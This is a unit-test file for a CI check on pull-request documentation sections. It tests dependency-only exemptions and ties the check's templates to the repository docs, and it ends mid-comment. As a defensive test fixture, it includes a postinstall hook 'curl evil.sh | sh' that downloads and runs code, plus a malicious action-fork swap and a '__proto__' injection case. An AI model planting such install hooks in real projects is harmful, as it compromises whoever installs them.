/**
 * check-docs-disposition.test.js — Unit tests for the PR-body section format
 * check (scripts/check-docs-disposition.js) that gates CI. Every PR carries a
 * "## Docs disposition" section (one line per governing doc, plus one per
 * judgment-only clause) and a "## Change record"; these tests prove the red
 * paths fire (missing/unexpected/duplicate/malformed lines, missing sections
 * and markers), that the shipped PR template's HTML comments are inert in both
 * directions, and that each declared class is exactly as narrow as documented:
 * the dependency-only class (the manifests' dependency-resolution fields and
 * same-action pin bumps), the release-automation class (the pipeline's own
 * branch plus the release-output surface, with the branch that counts derived
 * from the pull request's head branch and head repository — so the class is
 * driven over each shape those inputs arrive in, under a GitHub Actions run and
 * without one), and the governance-data-only class (one recorded line replacing
 * the per-doc wall, unearned anywhere else).
 *
 * Beyond the check's own behaviour, the suite welds it to the committed
 * surfaces it is stated on and read from: both publish workflows to the
 * automation branch and to one generated PR body apiece, CONTRIBUTING's
 * exemption paragraph to the fields the exemption reads and to citing the
 * release-output surface by its home, the governance line CONTRIBUTING fences
 * and the PR template scaffolds to the constant this check builds its own red
 * output from, the per-doc grammar those same two surfaces show — and the
 * check's own red output beside them — to the one set of forms both are
 * rendered from, the clause example's anchor to a clause the registry carries
 * as judgment-only, and the mutation cadence to the workflow schedule that is
 * the fact: its trigger set and each cron field read on its own, the cron's own
 * comment included, and each prose surface restating that cadence held at its
 * own site.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { execFileSync, spawnSync } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import yaml from 'js-yaml';
import {
  changedLines,
  isPinOnlyWorkflowDiff,
  isDependencyOnlyPackageJsonDiff,
  isDependencyOnlyCargoTomlDiff,
  PACKAGE_JSON_DEPENDENCY_FIELDS,
  isDependencyOnlyDiff,
  isReleaseAutomationDiff,
  isGovernanceDataDiff,
  exemptionClass,
  DEPENDENCY_ONLY_CLASS,
  RELEASE_AUTOMATION_CLASS,
  GOVERNANCE_MARKER,
  GOVERNANCE_LINE_TEMPLATE,
  CHANGE_RECORD_HEADING,
  CHANGE_RECORD_MARKERS,
  UPDATED_LINE_TEMPLATE,
  UNAFFECTED_LINE_TEMPLATE,
  CLAUSE_LINE_TEMPLATE,
  CLAUSE_EXAMPLE_ANCHOR,
  updatedLine,
  unaffectedLine,
  clauseLine,
  FORM_ANCHOR,
  MUTATION_CADENCE,
  MUTATION_LINE,
  REGISTRY_PATH,
  isExemptDiff,
  docsInScope,
  expectedDispositionLines,
  parseDispositionSection,
  parseGovernanceSection,
  stripHtmlComments,
  extractSection,
  auditBody,
} from '../../../../scripts/check-docs-disposition.js';
import { MAP_PATH } from '../../../../scripts/check-area-map.js';
import {
  WORKFLOW_FILE_RE,
  WORKFLOW_HEADER,
  WORKFLOW_SECTION,
} from '../../../../scripts/check-doc-closure.js';
import {
  escapeForRegExp,
  extractClauseSection,
  extractHeadingSection,
  parseTables,
} from '../../../../scripts/check-test-inventory.js';
import { AUTOMATED_BRANCH } from '../../../../scripts/check-no-release-outputs.js';

/** A committed file of this repository, read as the shipped surface it is. */
const repoFile = (rel) =>
  readFileSync(path.resolve(import.meta.dirname, '../../../..', rel), 'utf8');

/** The `text`-fenced blocks of a markdown file, fence markers stripped. */
const fencedBlocks = (rel) =>
  [...repoFile(rel).matchAll(/```text\n([\s\S]*?)```/g)].map((m) => m[1]);

const MAP = {
  description: 'test map',
  'repo-wide': { description: 'x', docs: ['README.md', 'docs/hub.md'] },
  areas: {
    alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md', 'docs/hub.md'] },
    tooling: { code: ['scripts/**'], docs: ['docs/tooling.md'] },
  },
  unassigned: [],
  'declared-governance': [],
  'governance-partitions': [],
};

const REGISTRY = {
  description: 'test registry',
  prefixes: { AL: 'docs/alpha.md' },
  retired: { AL: [] },
  clauses: [
    { doc: 'docs/alpha.md', clause: 'AL-1', tag: 'judgment-only', justification: 'x' },
    { doc: 'docs/alpha.md', clause: 'AL-2', tag: 'check-exists', 'check-ref': 'scripts/x.js' },
    { doc: 'docs/alpha.md', clause: 'AL-3', tag: 'judgment-only', justification: 'y' },
  ],
};

const noContent = () => null;

const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);

/** Minimal unified diff: context lines prefixed ' ', changes '+'/'-'. */
const diff = (lines) => ['--- a/f', '+++ b/f', '@@ -1 +1 @@', ...lines].join('\n');

/**
 * Full-file unified diff between two package.json texts, as a delete-all /
 * add-all hunk — a valid unified diff that, like the caller's full-context
 * `git diff -U<huge>`, carries both complete sides.
 */
const jdiffText = (beforeText, afterText) =>
  [
    '--- a/package.json',
    '+++ b/package.json',
    '@@ -1 +1 @@',
    ...beforeText.split('\n').map((l) => `-${l}`),
    ...afterText.split('\n').map((l) => `+${l}`),
  ].join('\n');

/** Full-file unified diff between two package.json objects. */
const jdiff = (before, after) =>
  jdiffText(JSON.stringify(before, null, 2), JSON.stringify(after, null, 2));

/** A realistic manifest touching every boundary the exemption must hold. */
const BASE_PKG = {
  name: 'fixture',
  version: '1.0.0',
  private: true,
  engines: { node: '>=24' },
  keywords: ['fixture'],
  scripts: { build: 'x' },
  overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2' },
  devDependencies: { 'left-pad': '^1.0.0' },
};

/** BASE_PKG with top-level fields replaced (shallow). */
const pkgWith = (patch) => ({ ...structuredClone(BASE_PKG), ...patch });

/** The check CLI, driven end to end by the throwaway-repo harness below. */
const SCRIPT = path.resolve(import.meta.dirname, '../../../../scripts/check-docs-disposition.js');

/**
 * A run with no release-automation context of any kind: no Actions event to
 * derive a head branch from, and no head ref supplied by hand. Both spawn
 * harnesses below apply it before the per-case env, so the baseline is a
 * property of the harness rather than something each case remembers: the
 * harnesses spread `process.env` into the child, and without this the
 * surrounding environment (a runner's, or a shell that happens to export
 * PR_HEAD_REF) would be an unstated input to every decision under test. A case
 * about the release-automation class states its own context on top, which is
 * what makes that context visible at the case that means it.
 */
const NO_AUTOMATION_CONTEXT = { GITHUB_ACTIONS: '', PR_HEAD_REF: '' };

/**
 * Commit `files` in a throwaway git repo, commit the changed versions over
 * them, and run the check CLI against that diff with the given env.
 * @returns {{ status: number | null, stdout: string, stderr: string }}
 */
const runCheckOnChange = (before, after, env) => {
  const tmp = mkdtempSync(path.join(os.tmpdir(), 'ddisp-rel-'));
  try {
    const g = (args) => execFileSync('git', args, { cwd: tmp, encoding: 'utf8' });
    const write = (files) => {
      for (const [rel, text] of Object.entries(files)) {
        const p = path.join(tmp, rel);
        mkdirSync(path.dirname(p), { recursive: true });
        writeFileSync(p, text);
      }
      g(['add', '.']);
    };
    g(['init', '-q', '-b', 'main']);
    g(['config', 'user.email', 't@example.com']);
    g(['config', 'user.name', 'Test']);
    write(before);
    g(['commit', '-qm', 'base']);
    const base = g(['rev-parse', 'HEAD']).trim();
    write(after);
    g(['commit', '-qm', 'change']);
    return spawnSync('node', [SCRIPT, base], {
      cwd: tmp,
      env: { ...process.env, ...NO_AUTOMATION_CONTEXT, ...env },
      encoding: 'utf8',
    });
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
};

describe('changedLines', () => {
  it('keeps content that begins with + or - at column 0, drops only file headers', () => {
    const text = diff(['+- a yaml list item', '-removed', ' context']);
    assert.deepEqual(changedLines(text), ['- a yaml list item', 'removed']);
  });
});

describe('isPinOnlyWorkflowDiff — the pin-bump exemption has teeth', () => {
  it('accepts a same-action SHA bump', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: actions/checkout@${SHA_B} # v7`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), true);
  });

  it('rejects an action identity swap even when both lines are pin-shaped', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: evil-fork/checkout@${SHA_B} # v6`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), false);
  });

  it('rejects short pins, non-pin lines, and rider content starting with -', () => {
    assert.equal(
      isPinOnlyWorkflowDiff(
        diff([`-      - uses: a/b@${'a'.repeat(7)}`, `+      - uses: a/b@${'b'.repeat(7)}`]),
      ),
      false,
    );
    assert.equal(isPinOnlyWorkflowDiff(diff([`+        run: npm run lint`])), false);
    const rider = diff([
      `-      - uses: actions/checkout@${SHA_A}`,
      `+      - uses: actions/checkout@${SHA_B}`,
      '+- a column-zero rider line',
    ]);
    assert.equal(isPinOnlyWorkflowDiff(rider), false);
  });

  it('rejects an empty diff', () => {
    assert.equal(isPinOnlyWorkflowDiff(diff([' unchanged'])), false);
  });
});

describe('isDependencyOnlyPackageJsonDiff — structural and field-aware', () => {
  it('accepts a version bump inside a dependency block', () => {
    const text = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('regression_402_nested_override_entries_are_exempt', () => {
    // Regression: PR #402 (scoped minimatch overrides) added NESTED override
    // objects and fell out of the exemption — the then line-based check only
    // accepted flat "name": "range" entries inside a dependency block, so a
    // dependency-resolution-only diff owed the full disposition sections.
    // https://github.com/Arsarneq/docent/pull/402
    // The fixture mirrors that PR's exact package.json hunk shape, context
    // lines included.
    const text = [
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1 +1 @@',
      ' {',
      '   "name": "fixture",',
      '   "scripts": {',
      '     "build": "x"',
      '   },',
      '   "overrides": {',
      '+    "@npmcli/config": {',
      '+      "minimatch": "^10.0.3"',
      '+    },',
      '     "js-yaml": "^4.2.0",',
      '-    "qs": "^6.15.2"',
      '+    "qs": "^6.15.2",',
      '+    "unified-engine": {',
      '+      "minimatch": "^10.0.3"',
      '+    }',
      '   },',
      '   "devDependencies": {',
      '     "left-pad": "^1.0.0"',
      '   }',
      ' }',
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('accepts nested override entries added, removed, or renamed', () => {
    const nested = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', 'unified-engine': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, nested)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, BASE_PKG)), true);
    const renamed = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', '@npmcli/config': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, renamed)), true);
  });

  it('accepts a whole dependency-resolution field added or removed', () => {
    const noOverrides = structuredClone(BASE_PKG);
    delete noOverrides.overrides;
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(noOverrides, BASE_PKG)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, noOverrides)), true);
  });

  it('rejects a change outside the dependency-resolution fields — npm scripts are real changes', () => {
    const text = jdiff(BASE_PKG, pkgWith({ scripts: { build: 'echo skipped' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('rejects a diff touching both a dependency field AND another field', () => {
    const both = pkgWith({
      devDependencies: { 'left-pad': '^1.3.0' },
      scripts: { build: 'x', postinstall: 'curl evil.sh | sh' },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, both)), false);
  });

  it('rejects engines, packageManager, and version changes — toolchain and release contracts, not resolution data', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ engines: { node: '>=26' } }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ packageManager: 'npm@11.0.0' }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ version: '1.0.1' }))),
      false,
    );
  });

  it('rejects array-field changes, including an array/object shape change', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: ['fixture', 'x'] }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: { fixture: true } }))),
      false,
    );
  });

  it('accepts key reordering and formatting-only diffs — the parsed manifest is identical', () => {
    // Reorder: same fields, different insertion order (JSON.stringify keeps it).
    const reordered = {
      version: BASE_PKG.version,
      name: BASE_PKG.name,
      scripts: BASE_PKG.scripts,
      engines: BASE_PKG.engines,
      keywords: BASE_PKG.keywords,
      private: BASE_PKG.private,
      devDependencies: BASE_PKG.devDependencies,
      overrides: BASE_PKG.overrides,
    };
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, reordered)), true);
    // Whitespace only: 2-space vs 4-space indentation.
    const wsOnly = jdiffText(JSON.stringify(BASE_PKG, null, 2), JSON.stringify(BASE_PKG, null, 4));
    assert.equal(isDependencyOnlyPackageJsonDiff(wsOnly), true);
  });

  it('tolerates the no-newline-at-end-of-file marker', () => {
    const text =
      jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })) +
      '\n\\ No newline at end of file';
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a partial-context fragment — even with the block opener visible (why the caller supplies full context)', () => {
    // Neither fragment parses as JSON, so neither can prove the change stays
    // inside dependency-resolution fields; both are non-exempt.
    const withOpener = diff([
      '   "devDependencies": {',
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
      '   }',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(withOpener), false);
    const openerDropped = diff([
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(openerDropped), false);
  });

  it('fails closed on non-object JSON and on an empty diff', () => {
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText('[1]', '[1, 2]')), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(diff([' unchanged'])), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(''), false);
  });

  it('regression: a "__proto__" member added or removed never rides the exemption', () => {
    // A plain a[f] read on the side missing the member resolves "__proto__"
    // through the prototype chain to Object.prototype, which deep-equals {} —
    // so the {} value is the case that would slip without own-property reads
    // ({"x": 1} walls either way).
    const before = JSON.stringify(BASE_PKG, null, 2);
    const inject = (value) =>
      before.replace('"name": "fixture",', `"name": "fixture",\n  "__proto__": ${value},`);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{}'))), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), before)), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{ "x": 1 }'))), false);
    // Present and identical on both sides: inert, a dep bump stays exempt.
    const bumped = JSON.stringify(
      pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }),
      null,
      2,
    ).replace('"name": "fixture",', '"name": "fixture",\n  "__proto__": {},');
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), bumped)), true);
  });

  it('accepts CRLF manifest content — the carriage returns are inter-token whitespace', () => {
    const crlf = (obj) => JSON.stringify(obj, null, 2).replace(/\n/g, '\r\n');
    const text = jdiffText(
      crlf(BASE_PKG),
      crlf(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a byte-order mark — the side does not parse', () => {
    const bom = (obj) => '\uFEFF' + JSON.stringify(obj, null, 2);
    const text = jdiffText(
      bom(BASE_PKG),
      bom(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('fails closed on a file-creation diff — the empty before side does not parse', () => {
    const created = [
      '--- /dev/null',
      '+++ b/package.json',
      '@@ -0,0 +1 @@',
      ...JSON.stringify(BASE_PKG, null, 2)
        .split('\n')
        .map((l) => `+${l}`),
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(created), false);
  });
});

describe('the exemption declaration — welded to its doctrine home', () => {
  /**
   * CONTRIBUTING's exemption paragraph, scoped to its own extent (the anchor
   * sentence through the next blank line) — the same scope both welds use, so
   * a declaration that loses a term cannot stay green off the same token
   * elsewhere in the file.
   */
  const exemptionParagraph = () => {
    const contributing = repoFile('.github/CONTRIBUTING.md');
    const anchor = 'Dependency-only PRs skip both sections';
    const start = contributing.indexOf(anchor);
    assert.notEqual(start, -1, `CONTRIBUTING.md must carry the "${anchor}" exemption paragraph`);
    const rest = contributing.slice(start);
    const end = rest.indexOf('\n\n');
    return end === -1 ? rest : rest.slice(0, end);
  };

  it('cites the release-output surface’s one home rather than restating its members', () => {
    // The release-automation class admits a PR by that enumeration, which is
    // documented as expected to grow — so the doctrine points at its home and
    // the pointer itself is welded, inside the same paragraph extent.
    assert.match(
      exemptionParagraph(),
      /scripts\/check-no-release-outputs\.js/,
      "CONTRIBUTING.md's exemption paragraph must cite scripts/check-no-release-outputs.js",
    );
  });

  it('every exempt field is named in CONTRIBUTING.md’s exemption paragraph', () => {
    // The boundary is declared in two homes — this exported list (the code the
    // gate runs) and the exemption paragraph in CONTRIBUTING's "Docs
    // Disposition and Change Record" section (the doctrine contributors read).
    // Weld them so they cannot drift apart silently — scoped to that
    // paragraph's extent, so a field dropped from the declaration cannot stay
    // green off the same token elsewhere in the file (e.g. `dependencies` in
    // setup prose).
    const paragraph = exemptionParagraph();
    for (const field of PACKAGE_JSON_DEPENDENCY_FIELDS) {
      assert.match(
        paragraph,
        new RegExp('`' + field + '`'),
        `CONTRIBUTING.md's exemption paragraph must name \`${field}\``,
      );
    }
  });
});

describe('the governance-data-only line — its template welded to the surfaces that show it', () => {
  it('CONTRIBUTING.md shows the template line verbatim in its fenced example', () => {
    // Contributors type the line exactly as the example spells it, and the
    // parser accepts exactly one spelling of the marker — so an example that
    // drifts teaches a line the check reports as malformed, and a placeholder
    // that drifts teaches a judgment the check's own red output does not ask
    // for. Exactly one fenced block opens with the marker, so a second one
    // added later cannot quietly satisfy this off a stale copy.
    const shown = fencedBlocks('.github/CONTRIBUTING.md').filter((block) =>
      block.trimStart().startsWith(GOVERNANCE_MARKER),
    );
    assert.equal(
      shown.length,
      1,
      `CONTRIBUTING.md must show exactly one fenced example opening with "${GOVERNANCE_MARKER}" (found ${shown.length})`,
    );
    assert.equal(
      shown[0].trim(),
      GOVERNANCE_LINE_TEMPLATE,
      'CONTRIBUTING.md’s fenced example must be the template line verbatim',
    );
  });

  it('the PR template scaffolds the template line verbatim in its Docs disposition comment', () => {
    // The same reason as above, on the surface a contributor actually opens.
    // Here the line sits inside a multi-line comment scaffold, so the pin reads
    // the marker-opening lines of the section: exactly one, spelling the
    // template. Asking only that the section contain the template would leave a
    // second, drifted marker line beside it green.
    const section = extractSection(
      repoFile('.github/PULL_REQUEST_TEMPLATE.md'),
      'Docs disposition',
    );
    assert.notEqual(section, null, 'the template must carry a "## Docs disposition" section');
    const shown = section
      .split('\n')
      .map((line) => line.trim())
      .filter((line) => line.startsWith(GOVERNANCE_MARKER));
    assert.equal(
      shown.length,
      1,
      `the PR template's Docs-disposition comment must carry exactly one "${GOVERNANCE_MARKER}" line (found ${shown.length})`,
    );
    assert.equal(
      shown[0],
      GOVERNANCE_LINE_TEMPLATE,
      "the PR template's Docs-disposition comment must spell the template line verbatim",
    );
  });
});

describe('the per-doc grammar — its forms welded to the surfaces that show them', () => {
  it('CONTRIBUTING.md shows the updated/unaffected pair verbatim in its fenced example', () => {
    // Contributors type the lines exactly as the example spells them, and the
    // check's own red output offers exactly one spelling of each — so an
    // example that drifts teaches a judgment the red does not ask for. Exactly
    // one fenced block opens with the verb, so a second one added later cannot
    // quietly satisfy this off a stale copy.
    const shown = fencedBlocks('.github/CONTRIBUTING.md').filter((block) =>
      block.trimStart().startsWith('updated:'),
    );
    assert.equal(
      shown.length,
      1,
      `CONTRIBUTING.md must show exactly one fenced example opening with "updated:" (found ${shown.length})`,
    );
    assert.equal(
      shown[0].trim(),
      [UPDATED_LINE_TEMPLATE, UNAFFECTED_LINE_TEMPLATE].join('\n'),
      'CONTRIBUTING.md’s fenced example must be the two per-doc forms verbatim',
    );
  });

  it('CONTRIBUTING.md shows the clause-anchored form verbatim in its fenced example', () => {
    // Same reason, for the line a clause-carrying doc adds. The clause example
    // is pinned whole — anchor included — so the example cannot drift onto a
    // clause the registry does not carry.
    const shown = fencedBlocks('.github/CONTRIBUTING.md').filter((block) =>
      block.trimStart().startsWith('unaffected:'),
    );
    assert.equal(
      shown.length,
      1,
      `CONTRIBUTING.md must show exactly one fenced example opening with "unaffected:" (found ${shown.length})`,
    );
    assert.equal(
      shown[0].trim(),
      CLAUSE_LINE_TEMPLATE,
      'CONTRIBUTING.md’s clause example must be the clause-anchored form verbatim',
    );
  });

  it('the PR template scaffolds the grammar forms verbatim in its Docs disposition comment', () => {
    // The same reason as above, on the surface a contributor actually opens.
    // The lines sit inside a multi-line comment scaffold, so the pin reads the
    // verb-opening lines of the section — the clause-anchored one told apart by
    // its anchor. Asking only that the section contain each form would leave a
    // second, drifted line beside it green.
    const section = extractSection(
      repoFile('.github/PULL_REQUEST_TEMPLATE.md'),
      'Docs disposition',
    );
    assert.notEqual(section, null, 'the template must carry a "## Docs disposition" section');
    const lines = section.split('\n').map((line) => line.trim());
    const pin = (label, predicate, template) => {
      const shown = lines.filter(predicate);
      assert.equal(
        shown.length,
        1,
        `the PR template's Docs-disposition comment must carry exactly one ${label} line (found ${shown.length})`,
      );
      assert.equal(
        shown[0],
        template,
        `the PR template's Docs-disposition comment must spell the ${label} form verbatim`,
      );
    };
    pin('"updated:"', (line) => line.startsWith('updated:'), UPDATED_LINE_TEMPLATE);
    pin(
      '"unaffected:" per-doc',
      (line) => line.startsWith('unaffected:') && !line.includes('§'),
      UNAFFECTED_LINE_TEMPLATE,
    );
    pin(
      'clause-anchored',
      (line) => line.startsWith('unaffected:') && line.includes('§'),
      CLAUSE_LINE_TEMPLATE,
    );
  });

  it('the clause example stands on a clause the registry carries as judgment-only', () => {
    // The example is a line the check would actually expect: a doc in scope
    // takes a clause line only for a clause the registry tags judgment-only. An
    // anchor that is retired, renamed, or retagged to a checked clause would
    // teach a line the check reports as out of scope, so the anchor is held to
    // the registry rather than to its own spelling.
    const [doc, marked] = CLAUSE_EXAMPLE_ANCHOR.split(' ');
    const clause = marked.replace(/^§/, '');
    const registry = JSON.parse(repoFile(REGISTRY_PATH));
    const rows = (registry.clauses ?? []).filter((r) => r.doc === doc && r.clause === clause);
    assert.equal(
      rows.length,
      1,
      `${REGISTRY_PATH} must carry exactly one row for the clause the example anchors on, ${doc} §${clause} (found ${rows.length})`,
    );
    assert.equal(
      rows[0].tag,
      'judgment-only',
      `${doc} §${clause} must stay tagged judgment-only — the example teaches a line the check expects only for such a clause`,
    );
  });
});

describe('the per-doc grammar — the red output rendered from the same forms', () => {
  // The weld above holds the docs to the forms; this holds the check's own red
  // output to them, so a line re-typed into the red (rather than rendered from
  // the form) is caught instead of drifting silently away from what the docs
  // teach.
  const MAP_FIXTURE = JSON.stringify({
    description: 'fixture map',
    'repo-wide': { description: 'x', docs: ['README.md'] },
    areas: { alpha: { code: ['packages/alpha/**'], docs: ['README.md'] } },
    unassigned: [],
    'declared-governance': [],
    'governance-partitions': [],
  });
  const registryFixture = (clauses) =>
    JSON.stringify({ description: 'fixture registry', prefixes: {}, retired: {}, clauses });
  const body = (dispositionLines) =>
    [
      '## Docs disposition',
      '',
      ...dispositionLines,
      '',
      '## Change record',
      '',
      'Intent: test.',
      'Outside knowledge: none.',
      MUTATION_LINE,
    ].join('\n');
  const redFor = (dispositionLines, clauses = []) =>
    runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: MAP_FIXTURE,
        [REGISTRY_PATH]: registryFixture(clauses),
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      { PR_BODY: body(dispositionLines) },
    );

  it('the missing-line red offers both per-doc forms, rendered for the doc it names', () => {
    const r = redFor([]);
    assert.equal(r.status, 1, `expected a red, got exit ${r.status}.\nstderr: ${r.stderr}`);
    assert.ok(
      r.stderr.includes(`${updatedLine('README.md')}   OR   ${unaffectedLine('README.md')}`),
      `the missing-line red must render both forms for the doc it names.\nstderr: ${r.stderr}`,
    );
  });

  it('the missing-line red offers the clause form for a clause entry it names', () => {
    // A clause line's placeholder asks about the rule, not the document, so the
    // red for a missing clause entry renders the clause form rather than the
    // per-doc one it would otherwise share a verb with.
    const r = redFor(
      [],
      [{ doc: 'README.md', clause: 'AL-1', tag: 'judgment-only', justification: 'x' }],
    );
    assert.equal(r.status, 1, `expected a red, got exit ${r.status}.\nstderr: ${r.stderr}`);
    assert.ok(
      r.stderr.includes(
        `${updatedLine('README.md §AL-1')}   OR   ${clauseLine('README.md §AL-1')}`,
      ),
      `the missing-line red must render the clause form for a clause entry.\nstderr: ${r.stderr}`,
    );
  });

  it('the malformed-line red states the form from the same two forms', () => {
    const r = redFor(['updated: README.md - not an em dash']);
    assert.equal(r.status, 1, `expected a red, got exit ${r.status}.\nstderr: ${r.stderr}`);
    assert.ok(
      r.stderr.includes(`"${updatedLine(FORM_ANCHOR)}" or "${unaffectedLine(FORM_ANCHOR)}"`),
      `the malformed-line red must state the form from the same forms.\nstderr: ${r.stderr}`,
    );
  });

  it('the change-record red offers the standing mutation sentence as the paste-able fix', () => {
    // What the check requires is the marker; the sentence behind it is fixed
    // text a contributor pastes, so the red names the marker and then offers
    // that sentence rather than leaving them to compose one. The pin is on the
    // offer as the red renders it — sentence and the line that introduces it —
    // so a sentence re-typed into the red instead of rendered from the constant
    // is caught here.
    const r = runCheckOnChange(
      {
        'README.md': 'a repo-wide doc\n',
        [MAP_PATH]: MAP_FIXTURE,
        [REGISTRY_PATH]: registryFixture([]),
      },
      { 'README.md': 'an edited repo-wide doc\n' },
      {
        PR_BODY: [
          '## Docs disposition',
          '',
          unaffectedLine('README.md').replace('<why this diff cannot violate it>', 'prose only'),
          '',
          '## Change record',
          '',
          'Intent: test.',
          'Outside knowledge: none.',
        ].join('\n'),
      },
    );
    assert.equal(r.status, 1, `expected a red, got exit ${r.status}.\nstderr: ${r.stderr}`);
    assert.ok(
      r.stderr.includes(`the "mutation:" line's standing sentence to paste:\n    ${MUTATION_LINE}`),
      `the change-record red must offer the standing sentence to paste.\nstderr: ${r.stderr}`,
    );
  });
});

/**
 * The mutation workflow, and the one reading of its schedule the two cadence
 * describes below share. Both — the schedule's own fields, and the prose
 * surfaces welded to them — derive every cron field and every day name from
 * here, so the path, the day numbering, and the parse cannot be spelled a
 * second time and drift.
 */
const MUTATION_WORKFLOW = '.github/workflows/mutation.yml';

/** Cron's own day-of-week numbering, which the guides' day names derive from. */
const DAY_NAMES = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];

/**
 * The cadence words these welds read: the one the schedule denotes plus the
 * ones that would contradict it. The vocabulary is stated here and nowhere
 * else, and the negative leg below forbids exactly this list minus the stated
 * cadence — that subtraction is what keeps the leg from forbidding the stated
 * cadence itself, and it is the only part of these welds a cadence change gets
 * for free. The schedule-shape cases encode, deliberately, what today's weekly
 * cadence means in cron fields — one fixed day-of-week, day-of-month and month
 * unrestricted, and the literal bind below — so a real cadence change re-derives
 * those cases rather than passing through them.
 */
const CADENCE_VOCABULARY = ['weekly', 'daily', 'nightly', 'monthly', 'hourly', 'fortnightly'];

/** One workflow's trigger block, as YAML reads it. */
const workflowTriggers = (wf) => yaml.load(repoFile(wf)).on;
const mutationTriggers = () => workflowTriggers(MUTATION_WORKFLOW);

/** The single schedule entry's cron fields, by name. */
const cronFields = (wf = MUTATION_WORKFLOW) => {
  const entries = workflowTriggers(wf).schedule;
  const [minute, hour, dom, month, dow] = entries[0].cron.trim().split(/\s+/);
  return { minute, hour, dom, month, dow };
};

/**
 * The day the schedule names, derived rather than spelled a second time —
 * guarded, so every reading below states a day the field actually denotes. The
 * guard's own subject is the form these welds stand on: the day-of-week field
 * has to stay a single fixed number in cron's 0-6 range for a day name to be
 * derivable from it at all.
 */
const scheduledDay = (wf = MUTATION_WORKFLOW) => {
  const { dow } = cronFields(wf);
  const day = DAY_NAMES[Number(dow)];
  assert.ok(
    day,
    `${wf}: day-of-week "${dow}" is not the single fixed number in cron's 0-6 ` +
      `range these welds derive a day name from`,
  );
  return day;
};

/** The guides and the doctrine document these welds read. */
const CI_GUIDE = 'docs/guides/ci.md';
const LOCAL_CI_GUIDE = 'docs/guides/local-ci.md';
const MUTATION_DOC = 'docs/test/strategy/mutation.md';

/** The other workflows the CI guide states a scheduled cadence for. */
const SCORECARD_WORKFLOW = '.github/workflows/scorecard.yml';
const AUDIT_WORKFLOW = '.github/workflows/docs-disposition-audit.yml';

/** The workflow inventory's trigger column, read by name rather than position. */
const RUNS_ON_HEADER = 'Runs on';

/** The cadence word as a sentence or a table cell opens with it. */
const Cadence = MUTATION_CADENCE[0].toUpperCase() + MUTATION_CADENCE.slice(1);

/**
 * The cadence a cron shape denotes, capitalised as a guide cell opens with it:
 * one fixed day-of-week with day-of-month and month unrestricted runs once a
 * week. A shape this reader does not model has no word here — the field cases
 * beside it are what red on such a schedule, and this stays null.
 */
const cadenceOf = ({ dom, month, dow }) =>
  /^[0-6]$/.test(dow) && dom === '*' && month === '*' ? 'Weekly' : null;

/**
 * A `#`-headed section's body: the lines between its heading and the next
 * heading — the extent a weld anchors in, so a word elsewhere in the document
 * cannot answer for the site under test. The slice is the shared
